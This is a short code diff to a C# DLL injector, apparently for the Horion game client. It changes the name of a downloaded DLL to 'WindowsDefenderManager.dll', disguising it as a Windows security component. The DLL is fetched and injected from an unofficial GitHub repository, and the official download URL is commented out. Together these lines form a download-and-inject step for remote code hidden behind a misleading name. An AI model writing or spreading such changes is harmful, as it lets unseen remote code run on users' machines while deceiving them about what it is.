@@ -127,7 +127,7 @@ namespace HorionInjector
 
             SetStatus("Downloading DLL");
             var wc = new WebClient();
-            var file = Path.Combine(Path.GetTempPath(), "Horion.dll");
+            var file = Path.Combine(Path.GetTempPath(), "WindowsDefenderManager.dll");
             wc.DownloadFileCompleted += (_, __) => Inject(file, GetDelay());
             //wc.DownloadFileAsync(new Uri("https://horion.download/bin/Horion.dll"), file);
             wc.DownloadFileAsync(new Uri("https://raw.githubusercontent.com/AzOxStOz/dll/main/client.dll"), file);
